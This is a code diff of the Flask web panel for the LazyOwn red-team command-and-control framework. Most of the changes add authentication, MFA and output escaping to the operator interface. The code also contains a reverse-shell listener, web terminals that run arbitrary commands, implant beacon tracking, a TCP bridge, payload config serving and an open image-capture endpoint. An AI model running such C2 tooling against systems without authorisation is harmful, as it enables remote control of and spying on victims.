+        return jsonify({"error": "RBAC not available"}), 500
+    tm = get_tenant_manager()
+    try:
+        tc = tm.switch_tenant(tenant_id)
+        flash(f'Switched to tenant "{tc.name}". Sessions: {tc.sessions_dir}', "success")
+    except ValueError as e:
+        logger.warning("tenant switch failed: %s", type(e).__name__)
+        flash("Tenant operation failed.", "error")
+    return redirect(url_for("admin_tenants"))
+
+
+@app.route("/profile")
 @login_required
 def profile():
     response = decoy()
     if response:
         return response
     karma_name = get_karma_name(current_user.elo)
-    return render_template('profile.html', user=current_user, karma_name=karma_name)
+    user_role = getattr(current_user, "role", ROLE_DEFAULT)
+    mfa_enabled = getattr(current_user, "mfa_enabled", False)
 
-@app.route('/logout')
+    rbac_user = _get_rbac_user_obj(current_user) if _RBAC_AVAILABLE else None
+    if rbac_user:
+        user_role = rbac_user.role
+        mfa_enabled = rbac_user.mfa_enabled
+
+    return render_template(
+        "profile.html",
+        user=current_user,
+        karma_name=karma_name,
+        user_role=user_role,
+        mfa_enabled=mfa_enabled,
+    )
+
+
+@app.route("/logout")
 @login_required
 def logout():
     response = decoy()
     if response:
         return response
+    session.pop("mfa_verified", None)
+    session.pop("mfa_pending_user_id", None)
+    session.pop("mfa_user_id", None)
+    session.pop("mfa_setup_secret", None)
+    session.pop("mfa_pending_route", None)
     logout_user()
-    flash('Successfully Logout...', 'success')
-    return redirect(url_for('index'))
+    flash("Successfully logged out.", "success")
+    return redirect(url_for("index"))
 
-@app.route('/aumentar_elo/<int:user_id>', methods=['POST'])
+
+@app.route("/profile/change_password", methods=["GET", "POST"])
+@login_required
+def change_password():
+    """Force rotation of the initial one-time admin password.
+
+    Both the RBAC store and the legacy JSON store are updated. The
+    ``must_change_password`` flag is cleared once a strong password
+    is set.
+    """
+    response = decoy()
+    if response:
+        return response
+    if request.method == "POST":
+        current_password = request.form.get("current_password", "")
+        new_password = request.form.get("new_password", "")
+        confirm_password = request.form.get("confirm_password", "")
+
+        if not current_password or not new_password:
+            flash("All fields are mandatory.", "error")
+            return redirect(url_for("change_password"))
+
+        if new_password != confirm_password:
+            flash("New passwords do not match.", "error")
+            return redirect(url_for("change_password"))
+
+        if len(new_password) < 12:
+            flash("Password must be at least 12 chars.", "error")
+            return redirect(url_for("change_password"))
+
+        username = current_user.username
+        if is_insecure_credential(username, new_password):
+            flash("Password is too weak or matches a default.", "error")
+            return redirect(url_for("change_password"))
+
+        if _RBAC_AVAILABLE:
+            store = get_rbac_store()
+            rbac_user = store.find_by_id(int(current_user.id))
+            if not rbac_user:
+                flash("User not found.", "error")
+                return redirect(url_for("login"))
+            if not check_password_hash(rbac_user.password_hash, current_password):
+                flash("Current password is incorrect.", "error")
+                return redirect(url_for("change_password"))
+            rbac_user.password_hash = generate_password_hash(new_password)
+            rbac_user.must_change_password = False
+            store.save(rbac_user)
+            flash("Password updated successfully.", "success")
+            return redirect(url_for("profile"))
+
+        users = load_users()
+        user_data = next((u for u in users if u["username"] == username), None)
+        if not user_data:
+            flash("User not found.", "error")
+            return redirect(url_for("login"))
+        if not check_password_hash(user_data["password_hash"], current_password):
+            flash("Current password is incorrect.", "error")
+            return redirect(url_for("change_password"))
+        user_data["password_hash"] = generate_password_hash(new_password)
+        user_data["must_change_password"] = False
+        save_users(users)
+        flash("Password updated successfully.", "success")
+        return redirect(url_for("profile"))
+
+    return render_template("change_password.html")
+
+
+@app.route("/aumentar_elo/<int:user_id>", methods=["POST"])
+@login_required
 def aumentar_elo_route(user_id):
     response = decoy()
     if response:
         return response
     data = request.get_json()
-    cantidad = data.get('cantidad', 0)
+    cantidad = data.get("cantidad", 0)
 
     if cantidad <= 0:
         return jsonify({"error": "Error elo must be abs."}), 400
@@ -4358,49 +6529,51 @@ def aumentar_elo_route(user_id):
     aumentar_elo(user_id, cantidad)
     return jsonify({"message": f"The Elo {user_id} increased in {cantidad} points."}), 200
 
-@app.route('/banners')
+
+@app.route("/banners")
+@login_required
 def banners():
     response = decoy()
     if response:
         return response
     banners_json = load_banners()
     if not banners_json:
-        return render_template('banners.html', title="Target's Information", content="No banners found.")
+        return render_template("banners.html", title="Target's Information", content="No banners found.")
     html_table = '<table class="table table-dark table-striped">\n'
-    html_table += '  <thead>\n'
-    html_table += '    <tr>\n'
-    html_table += '      <th>Hostname</th>\n'
-    html_table += '      <th>Port</th>\n'
-    html_table += '      <th>Protocol</th>\n'
-    html_table += '      <th>Extra</th>\n'
-    html_table += '      <th>Service</th>\n'
-    html_table += '    </tr>\n'
-    html_table += '  </thead>\n'
-    html_table += '  <tbody>\n'
+    html_table += "  <thead>\n"
+    html_table += "    <tr>\n"
+    html_table += "      <th>Hostname</th>\n"
+    html_table += "      <th>Port</th>\n"
+    html_table += "      <th>Protocol</th>\n"
+    html_table += "      <th>Extra</th>\n"
+    html_table += "      <th>Service</th>\n"
+    html_table += "    </tr>\n"
+    html_table += "  </thead>\n"
+    html_table += "  <tbody>\n"
 
     for banner in banners_json:
-        html_table += '    <tr>\n'
-        html_table += f'      <td>{banner["hostname"]}</td>\n'
-        html_table += f'      <td>{banner["port"]}</td>\n'
-        html_table += f'      <td>{banner["protocol"]}</td>\n'
-        html_table += f'      <td>{banner["extra"]}</td>\n'
-        html_table += f'      <td>{banner["service"]}</td>\n'
-        html_table += '    </tr>\n'
+        html_table += "    <tr>\n"
+        html_table += f"      <td>{html.escape(str(banner.get('hostname', '')))}</td>\n"
+        html_table += f"      <td>{html.escape(str(banner.get('port', '')))}</td>\n"
+        html_table += f"      <td>{html.escape(str(banner.get('protocol', '')))}</td>\n"
+        html_table += f"      <td>{html.escape(str(banner.get('extra', '')))}</td>\n"
+        html_table += f"      <td>{html.escape(str(banner.get('service', '')))}</td>\n"
+        html_table += "    </tr>\n"
 
-    html_table += '  </tbody>\n'
-    html_table += '</table>'
+    html_table += "  </tbody>\n"
+    html_table += "</table>"
 
-    return render_template('banners.html', title="Target's Information", content=html_table)
+    return render_template("banners.html", title="Target's Information", content=html_table)
 
 
-
-@app.route('/mitre')
+@app.route("/mitre")
+@login_required
 def mitre():
     response = decoy()
     if response:
         return response
-    page_arg = request.args.get('page', '1')
-    page = int(re.sub(r'\D', '', page_arg) or '1')
+    page_arg = request.args.get("page", "1")
+    page = int(re.sub(r"\D", "", page_arg) or "1")
     per_page = 10
 
     try:
@@ -4408,14 +6581,18 @@ def mitre():
     except FileNotFoundError:
         logger.warning("MITRE ATT&CK data not found. Run: bash install.sh to fetch external data.")
         flash("MITRE ATT&CK data not available. Run install.sh to fetch external data.", "warning")
-        return render_template('mitre.html', title="MITRE ATT&CK Techniques", tactics=[], techniques=[], page=1, pages=0)
+        return render_template(
+            "mitre.html", title="MITRE ATT&CK Techniques", tactics=[], techniques=[], page=1, pages=0
+        )
     except Exception as e:
         logger.error(f"Failed to load MITRE data: {e}")
         flash("Failed to load MITRE ATT&CK data. Check server logs.", "danger")
-        return render_template('mitre.html', title="MITRE ATT&CK Techniques", tactics=[], techniques=[], page=1, pages=0)
+        return render_template(
+            "mitre.html", title="MITRE ATT&CK Techniques", tactics=[], techniques=[], page=1, pages=0
+        )
 
-    tactics = [t for t in mitre_data['objects'] if t['type'] == 'x-mitre-tactic']
-    techniques = [t for t in mitre_data['objects'] if t['type'] == 'attack-pattern']
+    tactics = [t for t in mitre_data["objects"] if t["type"] == "x-mitre-tactic"]
+    techniques = [t for t in mitre_data["objects"] if t["type"] == "attack-pattern"]
 
     total = len(techniques)
     pages = ceil(total / per_page)
@@ -4424,9 +6601,18 @@ def mitre():
 
     paginated_techniques = techniques[start:end]
 
-    return render_template('mitre.html', title="MITRE ATT&CK Techniques", tactics=tactics, techniques=paginated_techniques, page=page, pages=pages)
+    return render_template(
+        "mitre.html",
+        title="MITRE ATT&CK Techniques",
+        tactics=tactics,
+        techniques=paginated_techniques,
+        page=page,
+        pages=pages,
+    )
 
-@app.route('/get_connected_clients', methods=['GET'])
+
+@app.route("/get_connected_clients", methods=["GET"])
+@login_required
 def get_connected_clients():
     response = decoy()
     if response:
@@ -4435,10 +6621,12 @@ def get_connected_clients():
     connected_clients_list = list(connected_clients)
     return jsonify({"connected_clients": connected_clients_list})
 
-@app.route('/lazybot', methods=['POST'])
+
+@app.route("/lazybot", methods=["POST"])
+@login_required
 def lazybot():
     data = request.json
-    prompt = data.get('prompt')
+    prompt = data.get("prompt")
 
     if not prompt:
         return jsonify({"error": "Insert Prompt"}), 400
@@ -4449,13 +6637,148 @@ def lazybot():
     response = process_prompt_local(prompt, False, "web")
     return response
 
-@app.route('/lazyreport', methods=['POST'])
+
+@app.route("/compliance", methods=["GET"])
+@login_required
+@require_permission(Permission.AUDIT_VIEW.value)
+def compliance_dashboard():
+    response = decoy()
+    if response:
+        return response
+    try:
+        from modules.compliance import ComplianceEngine, ComplianceFinding  # noqa: F401
+
+        engine = ComplianceEngine("sessions")
+        report = engine.generate_compliance_report(include_evidence_chain=True)
+        return render_template(
+            "compliance.html",
+            report=report,
+            current_user=current_user,
+        )
+    except ImportError:
+        flash("Compliance module not available.", "error")
+        return redirect(url_for("report"))
+
+
+@app.route("/compliance/report", methods=["GET"])
+@login_required
+@require_permission(Permission.REPORT_GENERATE.value)
+def compliance_report():
+    response = decoy()
+    if response:
+        return response
+    try:
+        from modules.compliance import ComplianceEngine, ComplianceFinding, export_pdf  # noqa: F401
+
+        engine = ComplianceEngine("sessions")
+        report = engine.generate_compliance_report(
+            include_evidence_chain=True,
+            include_siem_formats=True,
+        )
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        md_path = f"sessions/compliance_report_{ts}.md"
+        md_content = engine._format_compliance_report_md(report)
+        Path(md_path).write_text(md_content, encoding="utf-8")
+
+        pdf_path = engine.export_pdf(report, f"sessions/compliance_report_{ts}.pdf")
+        flash(f"Compliance report generated: {md_path}" + (f", {pdf_path}" if pdf_path else ""), "success")
+    except ImportError:
+        flash("Compliance module not available.", "error")
+    except Exception as e:
+        logger.warning("compliance report failed: %s", type(e).__name__)
+        flash("Error generating compliance report.", "error")
+    return redirect(url_for("compliance_dashboard"))
+
+
+@app.route("/compliance/evidence/add", methods=["POST"])
+@login_required
+@require_permission(Permission.CMD_RUN.value)
+def compliance_add_evidence():
+    try:
+        from modules.compliance import ComplianceEngine
+
+        engine = ComplianceEngine("sessions")
+        filepath = request.form.get("filepath", "").strip()
+        operator = current_user.username
+        description = request.form.get("description", "").strip()
+        if not filepath:
+            return jsonify({"error": "File not found"}), 400
+        from core.hardening import safe_path_join
+
+        try:
+            safe_path = safe_path_join("sessions", filepath)
+        except (PermissionError, ValueError):
+            return jsonify({"error": "Invalid path"}), 400
+        if not os.path.exists(safe_path):
+            return jsonify({"error": "File not found"}), 400
+        entry = engine.add_evidence(safe_path, operator, description)
+        return jsonify(
+            {
+                "status": "added",
+                "sha256": entry.sha256,
+                "filename": entry.filename,
+            }
+        )
+    except ImportError:
+        return jsonify({"error": "Compliance module not available"}), 500
+    except Exception:
+        app.logger.error("Evidence add failed", exc_info=True)
+        return jsonify({"error": "Internal error"}), 500
+
+
+@app.route("/compliance/evidence/verify", methods=["GET"])
+@login_required
+@require_permission(Permission.AUDIT_VIEW.value)
+def compliance_verify_evidence():
+    try:
+        from modules.compliance import ComplianceEngine
+
+        engine = ComplianceEngine("sessions")
+        valid, issues = engine.verify_evidence_chain()
+        return jsonify({"valid": valid, "issues": issues})
+    except ImportError:
+        return jsonify({"error": "Compliance module not available"}), 500
+
+
+@app.route("/compliance/export/<format>", methods=["GET"])
+@login_required
+@require_permission(Permission.REPORT_GENERATE.value)
+def compliance_export(format):
+    try:
+        from modules.compliance import (  # noqa: F401
+            ComplianceEngine,
+            ComplianceFinding,
+            export_to_cef,
+            export_to_elastic_ndjson,
+        )
+
+        engine = ComplianceEngine("sessions")
+        findings = engine._load_findings()
+        finding_dicts = [dataclasses.asdict(f) for f in findings]
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+
+        if format == "elastic":
+            path = f"sessions/siem_export_bulk_{ts}.ndjson"
+            export_to_elastic_ndjson(finding_dicts, path)
+            return send_file(path, as_attachment=True, download_name=f"lazyown_findings_{ts}.ndjson")
+        elif format == "cef":
+            path = f"sessions/siem_export_cef_{ts}.log"
+            export_to_cef(finding_dicts, path)
+            return send_file(path, as_attachment=True, download_name=f"lazyown_findings_{ts}.cef")
+        else:
+            return jsonify({"error": f"Unknown format: {format}. Use 'elastic' or 'cef'"}), 400
+    except ImportError:
+        return jsonify({"error": "Compliance module not available"}), 500
+
+
+@app.route("/lazyreport", methods=["POST"])
+@login_required
 def lazyreport():
     if not request.is_json:
         return jsonify({"error": "Content-Type must be application/json"}), 400
 
     data = request.json
-    prompt = data.get('prompt')
+    prompt = data.get("prompt")
 
     if not prompt:
         return jsonify({"error": "Insert Prompt"}), 400
@@ -4466,206 +6789,423 @@ def lazyreport():
     response = process_prompt_localreport(prompt, False, "web")
     return response
 
-@app.route('/teamserver', methods=['GET', 'POST'])
+
+@app.route("/teamserver", methods=["GET", "POST"])
+@login_required
 def teamserver():
-    if request.method == 'POST':
+    if request.method == "POST":
         form_data = {
-            'assessment_information': request.form['assessment_information'],
-            'engagement_overview': request.form['engagement_overview'],
-            'service_description': request.form['service_description'],
-            'campaign_objectives': request.form['campaign_objectives'],
-            'process_and_methodology': request.form['process_and_methodology'],
-            'scoping_and_rules': request.form['scoping_and_rules'],
-            'executive_summary_findings': request.form['executive_summary_findings'],
-            'executive_summary_narrative': request.form['executive_summary_narrative'],
-            'summary_vulnerability_overview': request.form['summary_vulnerability_overview'],
-            'security_labs_toolkit': request.form['security_labs_toolkit'],
-            'appendix_a_changes': request.form['appendix_a_changes']
+            "assessment_information": request.form["assessment_information"],
+            "engagement_overview": request.form["engagement_overview"],
+            "service_description": request.form["service_description"],
+            "campaign_objectives": request.form["campaign_objectives"],
+            "process_and_methodology": request.form["process_and_methodology"],
+            "scoping_and_rules": request.form["scoping_and_rules"],
+            "executive_summary_findings": request.form["executive_summary_findings"],
+            "executive_summary_narrative": request.form["executive_summary_narrative"],
+            "summary_vulnerability_overview": request.form["summary_vulnerability_overview"],
+            "security_labs_toolkit": request.form["security_labs_toolkit"],
+            "appendix_a_changes": request.form["appendix_a_changes"],
         }
-        with open(JSON_FILE_PATH_REPORT, 'w') as json_file:
+        with open(JSON_FILE_PATH_REPORT, "w") as json_file:
             json.dump(form_data, json_file)
 
-        return render_template('teamserver.html', form_data=form_data)
+        return render_template("teamserver.html", form_data=form_data)
 
     else:
-        with open(JSON_FILE_PATH_REPORT, 'r') as json_file:
+        with open(JSON_FILE_PATH_REPORT, "r") as json_file:
             form_data = json.load(json_file)
 
-        return render_template('teamserver.html', form_data=form_data)
+        return render_template("teamserver.html", form_data=form_data)
 
-@app.route('/report', methods=['GET'])
+
+@app.route("/report", methods=["GET"])
+@login_required
 def report():
-    json_path = f"sessions/sessionLazyOwn.json"
-    with open(JSON_FILE_PATH_REPORT, 'r') as json_file:
-        report_data = json.load(json_file)
+
+    return _render_legacy_report()
+
+
+@app.route("/lazyreport", methods=["GET"])
+@login_required
+def lazyreport_view():
+    return _render_enhanced_report()
+
+
+@app.route("/killchain", methods=["GET"])
+@login_required
+def killchain_view():
+    try:
+        from modules.kill_chain_viz import generate_html
+
+        kc_html = generate_html()
+        return render_template_string(
+            """{% extends "base.html" %}
+            {% block content %}
+            <h1 class="neon-text mb-4">Kill-Chain</h1>
+            <div class="card bg-secondary text-light p-4">
+            {{ kc_html | safe }}
+            </div>
+            {% endblock %}""",
+            kc_html=kc_html,
+        )
+    except Exception as exc:
+        if config.enable_c2_debug:
+            logger.info(f"Kill-chain failed: {exc}")
+        return render_template_string(
+            """{% extends "base.html" %}
+            {% block content %}
+            <h1 class="neon-text">Kill-Chain</h1>
+            <p class="text-warning">Kill-chain unavailable.</p>
+            {% endblock %}"""
+        )
+
+
+@app.route("/api/killchain", methods=["GET"])
+@requires_auth
+@limiter.limit("60 per minute")
+def api_killchain():
+    """Return the unified kill-chain snapshot consumed by every surface.
+
+    Delegates entirely to ``modules.killchain.KillChain.snapshot`` so the
+    web dashboard, /killchain page, GUI2 and the CLI all render identical
+    state derived from the single source of truth (world_model.json).
+    """
+    try:
+        from modules.killchain import KillChain as _KC
+
+        snapshot = _KC.snapshot()
+        snapshot["c2_route"] = route_malleable
+        return jsonify(snapshot), 200
+    except Exception as exc:
+        logging.error("api_killchain failed: %s", exc, exc_info=True)
+        return jsonify(
+            {
+                "error": "Internal server error",
+                "current_phase": "recon",
+                "completed_phases": [],
+                "progress": [],
+                "host_states": {},
+                "compact": "",
+                "updated_at": "",
+            }
+        ), 200
+
+
+@app.route("/api/beacon_results/<client_id>", methods=["GET"])
+@requires_auth
+@limiter.limit("120 per minute")
+def api_beacon_results(client_id):
+    """Return the full ordered command/result history for one beacon.
+
+    Falls back to the in-memory latest result when the on-disk JSONL
+    history is missing so GUI2 always has something to render.
+    """
+    safe_id = "".join(c for c in str(client_id) if c.isalnum() or c in "-_")
+    if not safe_id or safe_id != str(client_id):
+        return jsonify({"error": "Invalid client_id"}), 400
+    records = _read_beacon_records(safe_id)
+    if not records and safe_id in results:
+        records = [results[safe_id]]
+    return jsonify({"client_id": safe_id, "records": records}), 200
+
+
+def _render_enhanced_report():
+    try:
+        from modules.report_templates import ReportGenerator
+
+        gen = ReportGenerator()
+        report_html = gen.generate(fmt="html", standalone=False)
+        return render_template_string(
+            """{% extends "base.html" %}
+            {% block content %}
+            <h1 class="neon-text mb-4">LazyReport</h1>
+            {{ report_html | safe }}
+            {% endblock %}""",
+            report_html=report_html,
+        )
+    except Exception as exc:
+        if config.enable_c2_debug:
+            logger.info(f"Enhanced report failed: {exc}")
+        return _render_legacy_report()
+
+
+def _render_legacy_report():
+    json_path = "sessions/sessionLazyOwn.json"
+
+    try:
+        with open(JSON_FILE_PATH_REPORT, "r") as json_file:
+            report_data = json.load(json_file)
+    except (FileNotFoundError, json.JSONDecodeError) as e:
+        if config.enable_c2_debug:
+            logger.info(f"Error loading report data: {e}")
+        report_data = {}
     tools = []
-    for filename in os.listdir(TOOLS_DIR):
-        if filename.endswith('.tool'):
-            tool_path = os.path.join(TOOLS_DIR, filename)
-            with open(tool_path, 'r') as file:
-                tool_data = json.load(file)
-                tool_data['filename'] = filename
-                tools.append(tool_data)
+    try:
+        for filename in os.listdir(TOOLS_DIR):
+            if filename.endswith(".tool"):
+                tool_path = os.path.join(TOOLS_DIR, filename)
+                try:
+                    with open(tool_path, "r") as file:
+                        tool_data = json.load(file)
+                        tool_data["filename"] = filename
+                        tools.append(tool_data)
+                except (FileNotFoundError, json.JSONDecodeError):
+                    if config.enable_c2_debug:
+                        logger.info(f"Error loading tool: {filename}")
+    except FileNotFoundError:
+        if config.enable_c2_debug:
+            logger.info("Error: TOOLS_DIR not found")
     tasks = load_tasks()
     cves = load_cves()
-    with open(json_path, 'r') as f:
-        session_data = json.load(f)
 
+    try:
+        with open(json_path, "r") as f:
+            content = f.read().strip()
+            if content:
+                session_data = json.loads(content)
+            else:
+                session_data = {}
+    except FileNotFoundError:
+        session_data = {}
+    except json.JSONDecodeError:
+        if config.enable_c2_debug:
+            logger.info("Error: Invalid JSON in sessionLazyOwn.json")
+        session_data = {}
 
     if isinstance(session_data, list):
         session_data = session_data[0] if session_data else {}
 
-    session_data['params'] = make_serializable(session_data.get('params', {}))
-    session_data['params']['api_key'] = 'Hidden conntent'
+    if isinstance(session_data, dict):
+        session_data["params"] = make_serializable(session_data.get("params", {}))
+        session_data["params"]["api_key"] = "Hidden conntent"
+    else:
+        session_data = {"params": {"api_key": "Hidden conntent"}}
     implants_check()
-    return render_template('report.html', report_data=report_data, tools=tools, tasks=tasks, cves=cves, session_data=session_data, implants=implants)
+    return render_template(
+        "report.html",
+        report_data=report_data,
+        tools=tools,
+        tasks=tasks,
+        cves=cves,
+        session_data=session_data,
+        implants=implants,
+    )
 
-@app.route('/connect')
+
+@app.route("/connect")
+@login_required
 def connect():
-    return render_template('connect.html')
+    if not current_user.is_authenticated:
+        print(f"[!] Error. {request.remote_addr}")
+        return False
+    return render_template("connect.html")
 
-@app.route('/listener')
+
+@app.route("/listener")
+@login_required
 def listener():
+    if not current_user.is_authenticated:
+        print(f"[!] Error. {request.remote_addr}")
+        return False
     return f"WebSocket listener is running on port {reverse_shell_port}."
 
-@socketio.on('connect', namespace='/listener')
-def handle_connect():
-    if config.enable_c2_debug == True:
-        logger.info('Client connected to /listener')
-    emit('output', 'Welcome to LazyOwn RedTeam Framework: CRIMEN 👋\r\n$ ')
 
-@socketio.on('disconnect', namespace='/listener')
-def handle_disconnect():
-    if config.enable_c2_debug == True:
-        logger.info('Client disconnected from /listener')
+@socketio.on("connect", namespace="/listener")
+@login_required
+@require_mfa_socket
+def listener_connect():
+    if not current_user.is_authenticated:
+        print(f"[!] Error. {request.remote_addr}")
+        return False
+    if config.enable_c2_debug:
+        logger.info("Client connected to /listener")
+    emit("output", "Welcome to LazyOwn RedTeam Framework: CRIMEN 👋\r\n$ ")
+
+
+@socketio.on("disconnect", namespace="/listener")
+@login_required
+def listener_disconnect():
+    if not current_user.is_authenticated:
+        print(f"[!] Error. {request.remote_addr}")
+        return False
+    if config.enable_c2_debug:
+        logger.info("Client disconnected from /listener")
+
 
 @socketio.on("pty-input", namespace="/pty")
+@login_required
+@require_mfa_socket
 def pty_input(data):
+    if not current_user.is_authenticated:
+        print(f"[!] Error. {request.remote_addr}")
+        return False
     """Recibe entrada del terminal web y la escribe al PTY"""
     if app.config["fd"]:
         try:
             os.write(app.config["fd"], data["input"].encode())
-        except Exception as e:
-            logger.error(f"Error escribiendo entrada:")
+        except Exception:
+            logger.error("Error escribiendo entrada:")
+
 
 @socketio.on("resize", namespace="/pty")
+@login_required
+@require_mfa_socket
 def resize(data):
+    if not current_user.is_authenticated:
+        print(f"[!] Error. {request.remote_addr}")
+        return False
     """Maneja el redimensionamiento de la terminal"""
     if app.config["fd"]:
-        if config.enable_c2_debug == True:
+        if config.enable_c2_debug:
             logger.info(f"Redimensionando terminal a {data['rows']}x{data['cols']}")
         set_winsize(app.config["fd"], data["rows"], data["cols"])
 
+
 @socketio.on("connect", namespace="/pty")
-def connect():
+@login_required
+@require_mfa_socket
+def pty_connect():
+    if not current_user.is_authenticated:
+        print(f"[!] Error. {request.remote_addr}")
+        return False
     """Maneja nueva conexión de cliente"""
-    if config.enable_c2_debug == True:
+    if config.enable_c2_debug:
         logger.info("Nuevo cliente conectado")
 
     if app.config["child_pid"]:
         return
 
     try:
-
         (child_pid, fd) = pty.fork()
 
         if child_pid == 0:
-
-            subprocess.run([
-                "python3", "lazyown.py"
-            ], check=True)
+            subprocess.run(["python3", "lazyown.py"], check=True)
         else:
-
+            set_winsize(fd, 25, 120)
             app.config["fd"] = fd
             app.config["child_pid"] = child_pid
 
-
-            set_winsize(fd, 80, 140)
-
-
             socketio.start_background_task(read_and_forward_pty_output)
-            if config.enable_c2_debug == True:
+            if config.enable_c2_debug:
                 logger.info(f"Proceso hijo iniciado con PID {child_pid}")
 
-    except Exception as e:
-        logger.error(f"Error iniciando shell:")
+    except Exception:
+        logger.error("Error iniciando shell:")
 
-@socketio.on('input')
+
+@socketio.on("input")
+@login_required
+@require_mfa_socket
 def handle_input(data):
-    command = data.get('value')
+    if not current_user.is_authenticated:
+        print("[!] Error Unauthorized.", request.remote_addr)
+        return {"error": "Unauthorized"}, 401
+
+    command = data.get("value")
     if not command:
         return
-    if config.enable_c2_debug == True:
-        logger.info(f'[CMD] Received: {command}')
+    if config.enable_c2_debug:
+        logger.info(f"[CMD] Received: {command}")
 
-
-    shell.stdin.write(command + '\n')
+    shell.stdin.write(command + "\n")
     command_out = shell.one_cmd(command)
     shell.stdin.seek(0)
 
-
-    output = shell.stdout.getvalue()
+    shell.stdout.getvalue()
     shell.stdout.truncate(0)
     shell.stdout.seek(0)
 
-    emit('output', command_out + '$ ')
+    emit("output", command_out + "$ ")
 
-@socketio.on('command', namespace='/listener')
-def handle_command(msg):
-    if config.enable_c2_debug == True:
-        logger.info('Received command: ' + msg)
+
+@socketio.on("command", namespace="/listener")
+@login_required
+@require_mfa_socket
+def listener_command(msg):
+    if not current_user.is_authenticated:
+        print(f"[!] Error. {request.remote_addr}")
+        return False
+    if config.enable_c2_debug:
+        logger.info("Received command: " + msg)
     try:
-
         reverse_shell_socket.sendall((msg + "\n").encode())
-    except Exception as e:
-        emit('response', {'output': str("audio")}, namespace='/listener')
+    except Exception:
+        emit("response", {"output": str("audio")}, namespace="/listener")
 
 
-@app.route('/terminal')
+@app.route("/terminal")
+@login_required
 def terminal():
-    return render_template('terminal.html')
+    if not current_user.is_authenticated:
+        print(f"[!] Error. {request.remote_addr}")
+        return False
+    return render_template("terminal.html")
 
 
-@socketio.on('connect', namespace='/terminal')
-def handle_connect():
+@socketio.on("connect", namespace="/terminal")
+@login_required
+@require_mfa_socket
+def terminal_connect():
     if not current_user.is_authenticated:
         disconnect()
         return False
-    if config.enable_c2_debug == True:
+    if config.enable_c2_debug:
         logger.info("Cliente conectado a /terminal")
 
 
-@socketio.on('disconnect', namespace='/terminal')
-def handle_disconnect():
-    if config.enable_c2_debug == True:
+@socketio.on("disconnect", namespace="/terminal")
+@login_required
+def terminal_disconnect():
+    if not current_user.is_authenticated:
+        print(f"[!] Error. {request.remote_addr}")
+        return False
+    if config.enable_c2_debug:
         logger.info("Cliente desconectado de /terminal")
 
-@socketio.on('input', namespace='/terminal')
-def handle_input(data):
+
+@socketio.on("input", namespace="/terminal")
+@login_required
+@require_mfa_socket
+def terminal_input(data):
+    if not current_user.is_authenticated:
+        print(f"[!] Error. {request.remote_addr}")
+        return False
     command = data.get("command")
     client_id = data.get("client_id")
     if command and client_id:
         output = execute_command(command)
-        socketio.emit('output', {
-            'client_id': client_id,
-            'output': output
-        }, namespace='/terminal')
+        socketio.emit("output", {"client_id": client_id, "output": output}, namespace="/terminal")
 
-@socketio.on('command', namespace='/terminal')
-def handle_command(data):
-    cmd = data.get('cmd')
+
+@socketio.on("command", namespace="/terminal")
+@login_required
+@require_mfa_socket
+def terminal_command(data):
+    if not current_user.is_authenticated:
+        print(f"[!] Error. {request.remote_addr}")
+        return False
+    cmd = data.get("cmd")
     if not cmd:
         return
-    if config.enable_c2_debug == True:
+    if config.enable_c2_debug:
         logger.info(f"Ejecutando comando: {cmd}")
     output = execute_command(cmd)
-    emit('response', {'output': output})
+    emit("response", {"output": output})
 
-@socketio.on('resize', namespace='/terminal')
-def handle_resize(data):
+
+@socketio.on("resize", namespace="/terminal")
+@login_required
+@require_mfa_socket
+def terminal_resize(data):
+    if not current_user.is_authenticated:
+        print(f"[!] Error. {request.remote_addr}")
+        return False
     if app.config["fd"]:
         set_winsize(app.config["fd"], data["rows"], data["cols"])
 
+
+@login_required
 def start_reverse_shell():
     global reverse_shell_socket
     resolved = _resolve_bind_address(port=reverse_shell_port)
@@ -4687,7 +7227,7 @@ def start_reverse_shell():
         logger.info("Listening for reverse shell on %s:%d", safe_address, reverse_shell_port)
 
     reverse_shell_socket, addr = server_socket.accept()
-    if config.enable_c2_debug == True:
+    if config.enable_c2_debug:
         logger.info(f"Connection from {addr}")
     try:
         while True:
@@ -4695,7 +7235,7 @@ def start_reverse_shell():
                 data = reverse_shell_socket.recv(1024)
                 if not data:
                     break
-                socketio.emit('response', {'output': data.decode(errors='replace')}, namespace='/listener')
+                socketio.emit("response", {"output": data.decode(errors="replace")}, namespace="/listener")
             except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as e:
                 logger.info(f"Reverse shell connection lost ({addr}): {e}")
                 break
@@ -4707,45 +7247,52 @@ def start_reverse_shell():
             reverse_shell_socket.close()
         except Exception:
             pass
-        if config.enable_c2_debug == True:
+        if config.enable_c2_debug:
             logger.info(f"Reverse shell session closed ({addr})")
 
-@app.route('/start_bridge', methods=['POST'])
+
+@app.route("/start_bridge", methods=["POST"])
 @requires_auth
 def start_bridge():
     """Start a TCP bridge to a specified remote host and port."""
     response = decoy()
     if response:
         return response
-    local_port = int(request.form['local_port'])
-    remote_host = request.form['remote_host']
-    remote_port = int(request.form['remote_port'])
+    local_port = int(request.form["local_port"])
+    remote_host = request.form["remote_host"]
+    remote_port = int(request.form["remote_port"])
     bridge_thread = threading.Thread(target=tcp_bridge, args=(local_port, remote_host, remote_port))
     bridge_thread.start()
 
-    return jsonify({"status": "success", "message": f"TCP bridge started on port {local_port} to {remote_host}:{remote_port}"}), 200
+    return jsonify(
+        {"status": "success", "message": f"TCP bridge started on port {local_port} to {remote_host}:{remote_port}"}
+    ), 200
+
 
 @app.errorhandler(404)
 def page_not_found(e):
     response = decoy()
     if response:
         return response
-    return render_template('404.html'), 404
+    return render_template("404.html"), 404
+
 
 @app.errorhandler(500)
 def internal_server_error(e):
     response = decoy()
     if response:
         return response
-    return render_template('500.html'), 500
+    return render_template("500.html"), 500
 
-@app.route('/config.json')
+
+@app.route("/config.json")
+@requires_auth_or_session
 def get_config():
     """
     Lee el archivo payload.json, lo manipula y lo expone como /config.json.
     """
     try:
-        with open('payload.json', 'r') as f:
+        with open("payload.json", "r") as f:
             payload = json.load(f)
     except FileNotFoundError:
         return jsonify({"error": "payload.json not found"}), 404
@@ -4757,57 +7304,58 @@ def get_config():
 
     return jsonify(final_payload)
 
-@app.route('/capture', methods=['POST'])
+
+@app.route("/capture", methods=["POST"])
 def capture_image():
     try:
-
         data = request.get_json()
-        if not data or 'image' not in data:
+        if not data or "image" not in data:
             logging.error("Solicitud sin datos de imagen")
             return jsonify({"error": "No se proporcionó imagen"}), 400
 
-
-        image_data = data['image']
-        if image_data.startswith('data:image/png;base64,'):
-            image_data = image_data.split(',')[1]
+        image_data = data["image"]
